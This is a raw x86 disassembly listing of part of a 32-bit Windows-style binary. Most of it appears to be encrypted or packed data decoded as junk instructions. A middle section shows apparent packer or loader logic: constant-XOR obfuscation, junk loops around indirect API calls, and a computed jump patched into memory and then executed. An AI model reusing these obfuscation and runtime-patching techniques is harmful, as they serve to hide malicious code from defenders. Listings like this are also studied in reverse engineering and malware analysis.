  406f11:	and    DWORD PTR [edi+0x7a],eax
  406f14:	xor    BYTE PTR [esi-0xe754c5e],ah
  406f1a:	outs   dx,BYTE PTR ds:[esi]
  406f1b:	and    eax,0xa16f62a3
  406f20:	xor    al,0xbe
  406f22:	imul   esp,DWORD PTR [ebx+edx*8+0x6b],0x3c
  406f27:	pop    ss
  406f28:	ins    DWORD PTR es:[edi],dx
  406f29:	cld    
  406f2a:	sbb    al,0xe2
  406f2c:	dec    edx
  406f2d:	scas   eax,DWORD PTR es:[edi]
  406f2e:	sbb    al,0x23
  406f30:	outs   dx,BYTE PTR ds:[esi]
  406f31:	cmp    DWORD PTR [edi-0x66e8d81c],esp
  406f37:	std    
  406f38:	test   al,0x9e
  406f3a:	stos   BYTE PTR es:[edi],al
  406f3b:	adc    eax,ebx
  406f3d:	mov    al,0xdd
  406f3f:	cmp    ebp,0xfee2b5ff
  406f45:	sub    esp,DWORD PTR [ebp-0x5df0bb98]
  406f4b:	pop    esi
  406f4c:	jnp    0x406fcb
  406f4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f4f:	pop    es
  406f50:	lods   al,BYTE PTR ds:[esi]
  406f51:	sahf   
  406f52:	int    0xc2
  406f54:	jnp    0x406fcc
  406f56:	in     eax,0x8e
  406f58:	fbld   TBYTE PTR [ebx-0x14]
  406f5b:	jno    0x406f60
  406f5d:	fwait
  406f5e:	test   eax,0x8730c8fa
  406f63:	pop    esp
  406f64:	lods   al,BYTE PTR ds:[esi]
  406f65:	fcmovu st,st(3)
  406f67:	adc    BYTE PTR [edx],dl
  406f69:	adc    ecx,DWORD PTR ds:0xb2ca376d
  406f6f:	sbb    eax,DWORD PTR [edx]
  406f71:	clc    
  406f72:	lods   al,BYTE PTR ds:[esi]
  406f73:	iret   
  406f74:	pop    ebp
  406f75:	mov    ah,0xd
  406f77:	mov    ebp,0xec9bca62
  406f7c:	xchg   edi,eax
  406f7d:	retf   
  406f7e:	mov    edi,DWORD PTR [edx-0x27b5cdca]
  406f84:	pop    ebx
  406f85:	xor    al,0x4
  406f87:	ds mov eax,0x8d370a73
  406f8d:	push   cs
  406f8e:	jmp    0x406fed
  406f90:	cmp    eax,0xda2f66d1
  406f95:	pop    edx
  406f96:	inc    esi
  406f97:	stos   DWORD PTR es:[edi],eax
  406f98:	pop    ds
  406f99:	lds    ebp,FWORD PTR [esi+0x2e]
  406f9c:	inc    edi
  406f9d:	outs   dx,BYTE PTR ds:[esi]
  406f9e:	aad    0x7a
  406fa0:	add    esi,DWORD PTR [edi+ebp*8+0x28]
  406fa4:	ja     0x40700a
  406fa6:	call   0xb871:0x11da7e9d
  406fad:	xchg   ebp,eax
  406fae:	xchg   BYTE PTR [eax+0x7c4468da],bl
  406fb4:	hlt    
  406fb5:	repnz push esp
  406fb7:	test   DWORD PTR [edx+0x36],ecx
  406fba:	mov    ch,0xcf
  406fbc:	xor    esp,DWORD PTR [esi+0x1d]
  406fbf:	mov    eax,ds:0xf5c90bd2
  406fc4:	mov    ds:0x4340501c,eax
  406fc9:	push   esi
  406fca:	xchg   edx,edi
  406fcc:	add    eax,0xc7c08090
  406fd1:	mov    ch,0xe5
  406fd3:	xor    DWORD PTR [eax+esi*2+0x32c90a4f],esi
  406fda:	jecxz  0x406faa
  406fdc:	dec    ebx
  406fdd:	add    eax,0x7f332e27
  406fe2:	push   ecx
  406fe3:	mov    bl,0xf2
  406fe5:	push   es
  406fe6:	sbb    cl,bl
  406fe8:	xor    al,0xbf
  406fea:	adc    eax,0x4eee9fcf
  406fef:	mov    dl,0xc
  406ff1:	idiv   BYTE PTR [ebp-0x1e1d71a3]
  406ff7:	out    0x37,eax
  406ff9:	push   esi
  406ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ffb:	out    dx,eax
  406ffc:	repz retf 0x52df
  407000:	loope  0x406fdb
  407002:	iret   
  407003:	(bad)  
  407004:	pop    esp
  407005:	mov    ecx,0x76209e74
  40700a:	cmp    al,0xbe
  40700c:	aad    0xa0
  40700e:	push   ss
  40700f:	sub    eax,0xaab9c4a1
  407014:	add    eax,0x2aa726c0
  407019:	enter  0x6d3,0x61
  40701d:	dec    ecx
  40701e:	fs int3 
  407020:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407021:	mov    ch,0x42
  407023:	sub    al,0x5a
  407025:	loope  0x406fb6
  407027:	push   ss
  407028:	mov    edx,edi
  40702a:	xchg   esp,eax
  40702b:	push   esp
  40702c:	sub    ebx,ebx
  40702e:	sbb    BYTE PTR [ecx-0x1d43180b],dh
  407034:	fcomi  st,st(0)
  407036:	stc    
  407037:	popa   
  407038:	push   ebp
  407039:	mov    edi,0x9499de91
  40703e:	and    al,0x5c
  407040:	popa   
  407041:	cmp    ecx,DWORD PTR [edi+0x101123ea]
  407047:	xchg   ecx,eax
  407048:	dec    edx
  407049:	add    DWORD PTR [eax],esi
  40704b:	rcl    BYTE PTR ds:0x5ecd53b7,1
  407051:	xor    ebx,DWORD PTR [ecx]
  407053:	lods   eax,DWORD PTR ds:[esi]
  407054:	mov    bl,0xfa
  407056:	inc    esi
  407057:	fmul   st(1),st
  407059:	popf   
  40705a:	jo     0x4070d6
  40705c:	std    
  40705d:	jge    0x407020
  40705f:	xchg   edi,eax
  407060:	push   ecx
  407061:	lahf   
  407062:	test   eax,0xabaaaa31
  407067:	aas    
  407068:	and    edx,DWORD PTR [ebx]
  40706a:	fmulp  st(2),st
  40706c:	mov    edx,0xa6c46519
  407071:	mov    ecx,0x2ece8ef0
  407076:	lea    edi,[ebx]
  407078:	and    BYTE PTR [ebp-0x5abe0088],0x9b
  40707f:	mov    es,eax
  407081:	es add dh,dl
  407084:	jnp    0x4070eb
  407086:	ret    0x170
  407089:	sbb    eax,0x5e857053
  40708e:	ret    
  40708f:	retf   0x3b82
  407092:	jl     0x40710c
  407094:	adc    dl,BYTE PTR [edx-0x58]
  407097:	xchg   ecx,eax
  407098:	outs   dx,BYTE PTR ds:[esi]
  407099:	inc    ebp
  40709a:	ins    BYTE PTR es:[edi],dx
  40709b:	popa   
  40709c:	mov    ebx,0x3c90aafe
  4070a1:	push   esi
  4070a2:	xor    ebp,esi
  4070a4:	mov    al,0x9d
  4070a6:	mov    ds:0x70142e23,al
  4070ab:	sbb    DWORD PTR [ecx+0x79ee2278],ebx
  4070b1:	enter  0x3cd4,0x5f
  4070b5:	add    edi,DWORD PTR [edx+0x3ae7f77d]
  4070bb:	jp     0x407074
  4070bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070be:	aas    
  4070bf:	sub    DWORD PTR [ebp+eiz*1+0x2c],0xc6662d39
  4070c7:	aas    
  4070c8:	sub    eax,0xb66ff0b9
  4070cd:	pop    ds
  4070ce:	mov    esp,0x27a53f72
  4070d3:	and    BYTE PTR [edx],al
  4070d5:	push   ds
  4070d6:	xchg   ecx,eax
  4070d7:	(bad)  
  4070d8:	cmp    eax,0x44ad3df0
  4070dd:	ins    DWORD PTR es:[edi],dx
  4070de:	mov    ah,0xb3
  4070e0:	dec    edx
  4070e1:	aam    0x9c
  4070e3:	inc    eax
  4070e4:	fyl2x  
  4070e6:	push   edi
  4070e7:	or     al,0x1d
  4070e9:	addr16 push ebx
  4070eb:	jns    0x40709b
  4070ed:	clc    
  4070ee:	inc    ecx
  4070ef:	addr16 lahf 
  4070f1:	cwde   
  4070f2:	mov    ecx,0xaea25cc0
  4070f7:	lock shr DWORD PTR [ebx],cl
  4070fa:	push   esi
  4070fb:	popf   
  4070fc:	mov    ecx,0x252999c9
  407101:	xchg   BYTE PTR [eax+0x17],bl
  407104:	loopne 0x407150
  407106:	out    dx,eax
  407107:	pushw  cs
  407109:	add    BYTE PTR [edi+0x73b5150a],cl
  40710f:	lds    ebx,FWORD PTR [ecx]
  407111:	or     BYTE PTR [eax-0x74],bl
  407114:	xor    dh,bl
  407116:	pop    edi
  407117:	mov    esp,0xe9746300
  40711c:	xchg   esi,eax
  40711d:	jae    0x40716f
  40711f:	add    BYTE PTR [eax-0x6b],ch
  407122:	push   cs
  407123:	mov    ebp,0x165f5c21
  407128:	gs addr16 cld 
  40712b:	mov    edx,0xa8082dc6
  407130:	frstor [ebx+0x41]
  407133:	imul   edx,DWORD PTR [esi+0x13051b2d],0x1f
  40713a:	scas   eax,DWORD PTR es:[edi]
  40713b:	loope  0x407166
  40713d:	outs   dx,DWORD PTR ds:[esi]
  40713e:	shl    DWORD PTR [edi+0x63146631],0x50
  407145:	(bad)  
  407146:	fmul   st(2),st
  407148:	cmp    ebx,ebp
  40714a:	mov    ds:0x134d5e98,eax
  40714f:	int    0x13
  407151:	and    eax,0x2f12517
  407156:	out    dx,al
  407157:	adc    dh,BYTE PTR [ecx+0x64fd58aa]
  40715d:	adc    dh,BYTE PTR [edi+0x4b891065]
  407163:	jge    0x407199
  407165:	mov    dh,BYTE PTR [ecx]
  407167:	(bad)  
  407169:	mov    ah,ah
  40716b:	repnz xchg esp,eax
  40716d:	adc    ebp,edi
  40716f:	inc    ecx
  407170:	dec    DWORD PTR [eax+0x1a64230a]
  407176:	jl     0x40718a
  407178:	sub    edx,ebp
  40717a:	push   0x25509299
  40717f:	repz add eax,0xa4dd46f3
  407185:	dec    edx
  407186:	add    ch,BYTE PTR [eax]
  407188:	fisub  WORD PTR [esi]
  40718a:	gs ja  0x407193
  40718d:	adc    bl,BYTE PTR [ebx+0x225dc662]
  407193:	jnp    0x407130
  407195:	dec    edi
  407196:	gs stos DWORD PTR es:[edi],eax
  407198:	stos   BYTE PTR es:[edi],al
  407199:	adc    eax,eax
  40719b:	lahf   
  40719c:	push   ss
  40719d:	jno    0x407153
  40719f:	cdq    
  4071a0:	sub    DWORD PTR [ecx-0x3eb71fca],ebx
  4071a6:	jns    0x407172
  4071a8:	les    eax,FWORD PTR [eax+0x32d13299]
  4071ae:	sti    
  4071af:	jl     0x4071c6
  4071b1:	mov    edi,0xf81418bd
  4071b6:	xor    eax,0xf23186f7
  4071bb:	push   ebx
  4071bc:	sub    ch,al
  4071be:	cmp    ah,BYTE PTR [esi-0x16]
  4071c1:	lods   al,BYTE PTR ds:[esi]
  4071c2:	shl    DWORD PTR [edx+0x4cdc39be],cl
  4071c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071c9:	inc    eax
  4071ca:	rcr    bl,cl
  4071cc:	mov    ebx,0x70878782
  4071d1:	adc    DWORD PTR [ebx-0x18],eax
  4071d4:	pop    es
  4071d5:	jle    0x407252
  4071d7:	xor    al,0xf2
  4071d9:	ret    
  4071da:	retf   0xb1eb
  4071dd:	push   esi
  4071de:	popa   
  4071df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e0:	icebp  
  4071e1:	mov    al,0x9e
  4071e3:	pop    ebp
  4071e4:	daa    
  4071e5:	mov    ch,0x31
  4071e7:	dec    ebp
  4071e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071e9:	and    ebx,DWORD PTR [ebx]
  4071eb:	enter  0x443a,0xb0
  4071ef:	lea    edi,[esi+0x7d]
  4071f2:	inc    edi
  4071f3:	sub    DWORD PTR [edx+0x45c28c7f],edi
  4071f9:	(bad)  
  4071fa:	call   FWORD PTR [edi-0x15e92f51]
  407200:	cmp    DWORD PTR [ebx],edi
  407202:	and    BYTE PTR [ebp+0x73d55f8b],ah
  407208:	sahf   
  407209:	sbb    eax,0x52ce8334
  40720e:	cmp    BYTE PTR [edi-0x33],dh
  407211:	mov    ds:0xddbac133,al
  407216:	jb     0x40724a
  407218:	add    BYTE PTR [ebx],al
  40721a:	ret    0x4589
  40721d:	or     BYTE PTR [ebx-0x3ecc13bb],cl
  407223:	add    eax,edx
  407225:	mov    edx,DWORD PTR [ebp+0x14]
  407228:	imul   eax,DWORD PTR [edx]
  40722b:	mov    edx,DWORD PTR [ebp-0x4]
  40722e:	xor    edx,ecx
  407230:	mov    ecx,DWORD PTR [ebp+0x8]
  407233:	lea    ecx,[edx+ecx*1+0x3272dd]
  40723a:	cmp    ecx,eax
  40723c:	je     0x4072b3
  407242:	mov    edi,DWORD PTR [ebp-0x14]
  407245:	mov    eax,DWORD PTR [ebp+0x8]
  407248:	mov    edx,DWORD PTR [ebp+0x14]
  40724b:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40724f:	mov    ecx,0x7510896
  407254:	xor    edx,edx
  407256:	xor    edi,ecx
  407258:	mov    esi,0x3272dd
  40725d:	add    edi,esi
  40725f:	div    edi
  407261:	mov    edx,DWORD PTR [ebp-0x4]
  407264:	xor    edx,ecx
  407266:	lea    eax,[edx+eax*1+0x3272dd]
  40726d:	mov    edx,DWORD PTR [ebp+0x8]
  407270:	mov    edi,DWORD PTR [ebp-0x20]
  407273:	mov    DWORD PTR [edi+edx*4],eax
  407276:	mov    eax,DWORD PTR [ebp-0x14]
  407279:	mov    edx,DWORD PTR [ebp+0x8]
  40727c:	xor    eax,ecx
  40727e:	lea    eax,[eax+edx*1+0x3272dd]
  407285:	mov    DWORD PTR [ebp+0x8],eax
  407288:	mov    eax,DWORD PTR [ebp-0x14]
  40728b:	mov    edx,DWORD PTR [ebp+0x14]
  40728e:	xor    eax,ecx
  407290:	add    eax,esi
  407292:	imul   eax,DWORD PTR [edx]
  407295:	mov    edx,DWORD PTR [ebp-0x4]
  407298:	xor    edx,ecx
  40729a:	mov    ecx,DWORD PTR [ebp+0x8]
  40729d:	lea    ecx,[edx+ecx*1+0x3272dd]
  4072a4:	cmp    ecx,eax
  4072a6:	jne    0x407242
  4072ac:	mov    eax,esi
  4072ae:	jmp    0x4072b8
  4072b3:	mov    eax,0x3272dd
  4072b8:	mov    ebx,0x7510896
  4072bd:	mov    ecx,DWORD PTR [ebp-0x4]
  4072c0:	xor    ecx,ebx
  4072c2:	add    ecx,eax
  4072c4:	mov    DWORD PTR [ebp-0xc],ecx
  4072c7:	mov    ebx,0x65655
  4072cc:	add    ebx,0x3234
  4072d2:	xchg   ebx,esi
  4072d4:	xor    ebx,ebx
  4072d6:	push   esi
  4072d7:	mov    esi,ebx
  4072d9:	pop    ebx
  4072da:	mov    edx,esi
  4072dc:	add    ebx,0x1002
  4072e2:	lea    eax,[ebp-0x10]
  4072e5:	add    edx,eax
  4072e7:	add    edx,0x5
  4072ea:	push   edx
  4072eb:	inc    esi
  4072ec:	pop    ecx
  4072ed:	dec    ecx
  4072ee:	xchg   ecx,eax
  4072ef:	dec    eax
  4072f0:	xchg   ecx,eax
  4072f1:	dec    ecx
  4072f2:	xchg   ecx,edx
  4072f4:	dec    edx
  4072f5:	push   edx
  4072f6:	mov    edx,ebx
  4072f8:	pop    ebx
  4072f9:	dec    ebx
  4072fa:	call   DWORD PTR [ebx]
  4072fc:	cmp    DWORD PTR [ebp+0x10],esi
  4072ff:	je     0x40731e
  407305:	xchg   edx,eax
  407306:	push   0xb
  407308:	pop    ecx
  407309:	push   0x4
  40730b:	pop    ebx
  40730c:	inc    ebx
  40730d:	xchg   ebx,ecx
  40730f:	sub    ebx,ecx
  407311:	xchg   ebx,ecx
  407313:	dec    ecx
  407314:	dec    ecx
  407315:	mov    eax,DWORD PTR [ebp-0x1c]
  407318:	imul   eax,ecx
  40731b:	add    esp,eax
  40731d:	xchg   edx,eax
  40731e:	push   eax
  40731f:	xor    ebx,ebx
  407321:	mov    edx,esp
  407323:	dec    edx
  407324:	inc    ebx
  407325:	add    ebx,DWORD PTR [edx+ebx*1]
  407328:	dec    ebx
  407329:	xor    edx,edx
  40732b:	add    DWORD PTR [ebp-0xc],ebx
  40732e:	pop    ebx
  40732f:	mov    eax,DWORD PTR [ebp-0xc]
  407332:	pop    edi
  407333:	pop    esi
  407334:	pop    ebx
  407335:	leave  
  407336:	ret    0x10
  407339:	push   ebp
  40733a:	mov    ebp,esp
  40733c:	sub    esp,0x7c
  40733f:	and    DWORD PTR ds:0x420e92,0x0
  407349:	jmp    0x40735b
  40734e:	mov    ecx,DWORD PTR ds:0x420e92
  407354:	inc    ecx
  407355:	mov    DWORD PTR ds:0x420e92,ecx
  40735b:	cmp    DWORD PTR ds:0x420e92,0x15
  407362:	jae    0x4073cc
  407368:	cmp    DWORD PTR ds:0x420e92,0x1f
  40736f:	jne    0x407388
  407375:	push   0x3dd4
  40737a:	push   0x422018
  40737f:	push   DWORD PTR [ebp-0xc]
  407382:	call   DWORD PTR ds:0x4247e5
  407388:	jmp    0x40734e
  40738d:	mov    DWORD PTR ds:0x420f64,0x1c
  407397:	cmp    DWORD PTR ds:0x420f64,0x0
  40739e:	je     0x4073cc
  4073a4:	cmp    DWORD PTR ds:0x420f64,0x1d
  4073ab:	jne    0x4073b7
  4073b1:	call   DWORD PTR ds:0x4247f1
  4073b7:	mov    eax,ds:0x420f64
  4073bc:	dec    eax
  4073bd:	mov    ds:0x420f64,eax
  4073c2:	jmp    0x407397
  4073c7:	adc    eax,0x653
  4073cc:	push   esi
  4073cd:	and    DWORD PTR ds:0x42200c,0x0
  4073d7:	jmp    0x4073e9
  4073dc:	mov    esi,DWORD PTR ds:0x42200c
  4073e2:	inc    esi
  4073e3:	mov    DWORD PTR ds:0x42200c,esi
  4073e9:	cmp    DWORD PTR ds:0x42200c,0x16
  4073f0:	jae    0x40742e
  4073f6:	cmp    DWORD PTR ds:0x42200c,0xa
  4073fd:	jne    0x407409
  407403:	call   DWORD PTR ds:0x4247f5
  407409:	cmp    DWORD PTR ds:0x42200c,0x9
  407410:	jne    0x407423
  407416:	mov    esi,DWORD PTR ds:0x42200c
  40741c:	inc    esi
  40741d:	mov    DWORD PTR ds:0x42200c,esi
  407423:	jmp    0x4073dc
  407428:	sbb    DWORD PTR ds:0x420f00,edx
  40742e:	push   edi
  40742f:	mov    eax,ds:0x424435
  407434:	mov    DWORD PTR ds:0x420f70,0x12
  40743e:	cmp    DWORD PTR ds:0x420f70,0x0
  407445:	je     0x40748b
  40744b:	cmp    DWORD PTR ds:0x420f70,0x17
  407452:	jne    0x407479
  407458:	push   0x87b3
  40745d:	push   DWORD PTR [ebp-0x28]
  407460:	push   0x420f68
  407465:	push   0x7b70
  40746a:	push   DWORD PTR [ebp-0x18]
  40746d:	push   DWORD PTR [ebp-0x24]
  407470:	push   DWORD PTR [ebp-0x14]
  407473:	call   DWORD PTR ds:0x4247f9
  407479:	mov    edi,DWORD PTR ds:0x420f70
  40747f:	dec    edi
  407480:	mov    DWORD PTR ds:0x420f70,edi
  407486:	jmp    0x40743e
  40748b:	mov    DWORD PTR [ebp-0x24],eax
  40748e:	mov    eax,ds:0x424541
  407493:	xor    esi,edi
  407495:	mov    DWORD PTR [ebp-0x34],eax
  407498:	and    edi,DWORD PTR ds:0x420f5c
  40749e:	and    DWORD PTR [ebp-0x30],0x0
  4074a2:	and    eax,edi
  4074a4:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  4074ab:	adc    DWORD PTR ds:0x420ef0,edx
  4074b1:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  4074b8:	mov    edi,DWORD PTR ds:0x420ec2
  4074be:	mov    eax,ds:0x420f7c
  4074c3:	sub    edi,eax
  4074c5:	sub    edi,DWORD PTR [edi+eax*1]
  4074c8:	mov    eax,DWORD PTR [ebp-0x10]
  4074cb:	or     edi,0x1b5b
  4074d1:	mov    ecx,DWORD PTR [ebp-0x10]
  4074d4:	and    DWORD PTR ds:0x420ea2,0x0
  4074de:	xor    esi,esi
  4074e0:	xor    esi,DWORD PTR ds:0x420ea2
  4074e6:	inc    esi
  4074e7:	mov    DWORD PTR ds:0x420ea2,esi
  4074ed:	cmp    DWORD PTR ds:0x420ea2,0x20
  4074f4:	jne    0x407508
  4074fa:	push   DWORD PTR [ebp-0x28]
  4074fd:	push   0x424093
  407502:	call   DWORD PTR ds:0x4247fd
  407508:	cmp    DWORD PTR ds:0x420ea2,0x19
  40750f:	jb     0x4074de
  407515:	sub    eax,ecx
  407517:	and    DWORD PTR ds:0x420fac,0x0
  407521:	xor    ecx,ecx
  407523:	or     ecx,DWORD PTR ds:0x420fac
  407529:	inc    ecx
  40752a:	mov    DWORD PTR ds:0x420fac,ecx
  407530:	cmp    DWORD PTR ds:0x420fac,0x5
  407537:	jne    0x407550
  40753d:	push   0x42414e
  407542:	push   0x0
  407544:	push   DWORD PTR [ebp-0x28]
  407547:	push   DWORD PTR [ebp-0x10]
  40754a:	call   DWORD PTR ds:0x424801
  407550:	cmp    DWORD PTR ds:0x420fac,0x4
  407557:	jne    0x40756a
  40755d:	mov    ecx,DWORD PTR ds:0x420fac
  407563:	inc    ecx
  407564:	mov    DWORD PTR ds:0x420fac,ecx
  40756a:	cmp    DWORD PTR ds:0x420fac,0x16
  407571:	jb     0x407521
  407577:	and    DWORD PTR ds:0x420f9c,0x0
  407581:	jmp    0x407593
  407586:	mov    ecx,DWORD PTR ds:0x420f9c
  40758c:	inc    ecx
  40758d:	mov    DWORD PTR ds:0x420f9c,ecx
  407593:	cmp    DWORD PTR ds:0x420f9c,0x11
  40759a:	jae    0x4075dc
  4075a0:	cmp    DWORD PTR ds:0x420f9c,0x5
  4075a7:	jne    0x4075bd
  4075ad:	push   0x420f74
  4075b2:	push   0x1cd6
  4075b7:	call   DWORD PTR ds:0x424805
  4075bd:	cmp    DWORD PTR ds:0x420f9c,0x4
  4075c4:	jne    0x4075d7
  4075ca:	mov    ecx,DWORD PTR ds:0x420f9c
  4075d0:	inc    ecx
  4075d1:	mov    DWORD PTR ds:0x420f9c,ecx
  4075d7:	jmp    0x407586
  4075dc:	mov    DWORD PTR [ebp-0x10],eax
  4075df:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  4075e6:	mov    eax,DWORD PTR [ebp-0x18]
  4075e9:	mov    ecx,DWORD PTR [ebp-0x18]
  4075ec:	sub    eax,ecx
  4075ee:	mov    DWORD PTR [ebp-0x18],eax
  4075f1:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  4075f8:	mov    eax,DWORD PTR [ebp-0xc]
  4075fb:	mov    ecx,DWORD PTR [ebp-0xc]
  4075fe:	sub    eax,ecx
  407600:	mov    DWORD PTR [ebp-0xc],eax
  407603:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40760a:	mov    eax,DWORD PTR [ebp-0x1c]
  40760d:	mov    ecx,DWORD PTR [ebp-0x1c]
  407610:	sub    eax,ecx
  407612:	mov    DWORD PTR [ebp-0x1c],eax
  407615:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40761c:	mov    eax,DWORD PTR [ebp-0x20]
  40761f:	mov    ecx,DWORD PTR [ebp-0x20]
  407622:	sub    eax,ecx
  407624:	mov    DWORD PTR [ebp-0x20],eax
  407627:	mov    eax,DWORD PTR [ebp-0x2c]
  40762a:	mov    ecx,DWORD PTR [ebp-0x20]
  40762d:	mov    esi,0x7510896
  407632:	xor    eax,esi
  407634:	mov    edi,0x3272dd
  407639:	add    eax,edi
  40763b:	or     eax,ecx
  40763d:	mov    DWORD PTR [ebp-0x20],eax
  407640:	mov    eax,DWORD PTR [ebp-0x4]
  407643:	mov    ecx,DWORD PTR [ebp-0x4]
  407646:	sub    eax,ecx
  407648:	mov    DWORD PTR [ebp-0x4],eax
  40764b:	or     DWORD PTR [ebp-0x4],0xf89c85be
  407652:	mov    eax,DWORD PTR [ebp-0xc]
  407655:	xor    eax,esi
  407657:	add    eax,edi
  407659:	push   eax
  40765a:	mov    eax,DWORD PTR [ebp-0x10]
  40765d:	xor    eax,esi
  40765f:	add    eax,edi
  407661:	push   eax
  407662:	mov    eax,DWORD PTR [ebp-0x4]
  407665:	xor    eax,esi
  407667:	add    eax,edi
  407669:	push   eax
  40766a:	lea    eax,[ebp-0x7c]
  40766d:	push   eax
  40766e:	push   DWORD PTR [ebp-0x2c]
  407671:	push   DWORD PTR [ebp-0x28]
  407674:	call   0x410b90
  407679:	test   eax,eax
  40767b:	je     0x4076a9
  407681:	lea    eax,[ebp-0x7c]
  407684:	push   eax
  407685:	mov    eax,DWORD PTR [ebp-0x28]
  407688:	xor    eax,esi
  40768a:	add    eax,edi
  40768c:	push   eax
  40768d:	mov    eax,DWORD PTR [ebp-0x24]
  407690:	add    eax,0xaa
  407695:	push   eax
  407696:	mov    eax,DWORD PTR [ebp-0x24]
  407699:	mov    eax,DWORD PTR [eax+0x198]
  40769f:	push   DWORD PTR [eax]
  4076a1:	call   0x402470
  4076a6:	mov    DWORD PTR [ebp-0x14],eax
  4076a9:	lea    eax,[ebp+0x4]
  4076ac:	mov    DWORD PTR [ebp-0x30],eax
  4076af:	mov    eax,DWORD PTR [ebp-0x14]
  4076b2:	test   eax,eax
  4076b4:	je     0x40771c
  4076ba:	lea    eax,[ebp-0x8]
  4076bd:	mov    DWORD PTR [ebp-0x38],eax
  4076c0:	mov    eax,DWORD PTR [ebp-0x34]
  4076c3:	mov    DWORD PTR [ebp-0x8],eax
  4076c6:	mov    eax,DWORD PTR [ebp-0x8]
  4076c9:	mov    ecx,DWORD PTR [ebp-0x14]
  4076cc:	sub    eax,ecx
  4076ce:	mov    DWORD PTR [ebp-0x8],eax
  4076d1:	mov    ecx,DWORD PTR [ebp-0x4]
  4076d4:	xor    ecx,esi
  4076d6:	mov    eax,0xffcd8d23
  4076db:	sub    eax,ecx
  4076dd:	add    DWORD PTR [ebp-0x8],eax
  4076e0:	mov    eax,DWORD PTR [ebp-0x8]
  4076e3:	mov    ecx,DWORD PTR [ebp-0x14]
  4076e6:	mov    DWORD PTR [ecx+0x1],eax
  4076e9:	mov    eax,DWORD PTR [ebp-0x14]
  4076ec:	push   DWORD PTR [ebp-0x24]
  4076ef:	mov    BYTE PTR [eax],0xe9
  4076f2:	mov    eax,ds:0x4242b1
  4076f7:	push   DWORD PTR [eax]
  4076f9:	push   DWORD PTR ds:0x42450d
  4076ff:	push   DWORD PTR ds:0x4242b9
  407705:	push   DWORD PTR ds:0x4244ed
  40770b:	push   DWORD PTR ds:0x4245a5
  407711:	push   DWORD PTR [ebp-0x28]
  407714:	push   DWORD PTR [ebp-0x2c]
  407717:	mov    eax,DWORD PTR [ebp-0x14]
  40771a:	call   eax
  40771c:	mov    eax,DWORD PTR [ebp-0x30]
  40771f:	mov    ecx,DWORD PTR ds:0x4244b1
  407725:	add    DWORD PTR [eax],ecx
  407727:	pop    edi
  407728:	pop    esi
  407729:	leave  
  40772a:	ret    
  40772b:	push   ebp
  40772c:	mov    ebp,esp
  40772e:	sub    esp,0x18
  407731:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  407738:	lea    eax,[ebp+0x14]
  40773b:	mov    DWORD PTR [ebp-0x4],eax
  40773e:	jmp    0x409ab8
  407743:	das    
  407744:	or     DWORD PTR [eax+0x13b778ea],edx
  40774a:	mov    esp,DWORD PTR [esi-0x10]
  40774d:	in     eax,0x6d
  40774f:	sbb    esi,DWORD PTR [eax+0x68]
  407752:	fcomp  QWORD PTR [edx+0x197a7a20]
  407758:	pop    edi
  407759:	jp     0x4077d5
  40775b:	pusha  
  40775c:	adc    al,0xf5
  40775e:	les    ecx,FWORD PTR [edi+0x6fb56094]
  407764:	mov    eax,0xa687cc42
  407769:	mov    dl,0x4d
  40776b:	(bad)  
  40776c:	rol    ebp,cl
  40776e:	jbe    0x4077b7
  407770:	xlat   BYTE PTR ds:[ebx]
  407771:	sbb    DWORD PTR [edx+0x2534d108],0xa5144532
  40777b:	and    eax,0x367715ce
  407780:	ja     0x4077ae
  407782:	test   eax,0xafcdf5c0
  407787:	xor    ch,bl
  407789:	retf   
  40778a:	aad    0x1b
  40778c:	fs cs mov bl,0xa5
  407790:	push   ss
  407791:	push   eax
  407792:	cdq    
  407793:	loope  0x40779f
  407795:	sar    BYTE PTR [ebp+0x3c],cl
  407798:	sub    dl,ah
  40779a:	pop    edx
  40779b:	inc    ch
  40779d:	out    0x67,al
  40779f:	inc    esi
  4077a0:	add    eax,0x9ec662dc
  4077a5:	mov    bl,0x4d
  4077a7:	mov    ds:0x92b610f8,eax
  4077ac:	call   0xb3b5:0x827e15e8
  4077b3:	pushw  ss
  4077b5:	pop    eax
  4077b6:	jne    0x407786
  4077b8:	arpl   WORD PTR [esi+0x788882fe],si
  4077be:	push   esp
  4077bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c0:	stos   DWORD PTR es:[edi],eax
  4077c1:	mov    ah,0x9e
  4077c3:	test   al,0xd2
  4077c5:	popa   
  4077c6:	dec    eax
  4077c7:	dec    esi
  4077c8:	xchg   ecx,eax
  4077c9:	jle    0x407846
  4077cb:	loopne 0x40780c
  4077cd:	pop    ds
  4077ce:	xor    eax,0xe6cfd427
  4077d3:	dec    ebp
  4077d4:	bound  eax,QWORD PTR [eax-0x36]
  4077d7:	popf   
  4077d8:	push   ecx
  4077d9:	sub    DWORD PTR [edx-0x587ca16b],0xffffffd8
  4077e0:	retf   0x8af1
  4077e3:	popa   
  4077e4:	sub    ch,BYTE PTR [ebx+0x832d948]
  4077ea:	aaa    
  4077eb:	xchg   BYTE PTR es:[ebx+0x7a],ch
  4077ef:	mov    bh,0xe8
  4077f1:	pop    ebx
  4077f2:	lahf   
  4077f3:	test   eax,0xe9182d65
  4077f8:	jbe    0x407852
  4077fa:	popa   
  4077fb:	mov    ebx,0x2bbe6d7b
  407800:	sub    ah,ah
  407802:	add    eax,edx
  407804:	es and cl,al
  407807:	adc    BYTE PTR [edi],bh
  407809:	fwait
  40780a:	mov    eax,0xdaf3cab
  40780f:	mov    ecx,edx
  407811:	jb     0x40782d
  407813:	lods   eax,DWORD PTR ds:[esi]
  407814:	test   dh,ah
  407816:	xor    eax,0x57502d
  40781b:	pushf  
  40781c:	shl    cl,1
  40781e:	dec    ecx
  40781f:	sahf   
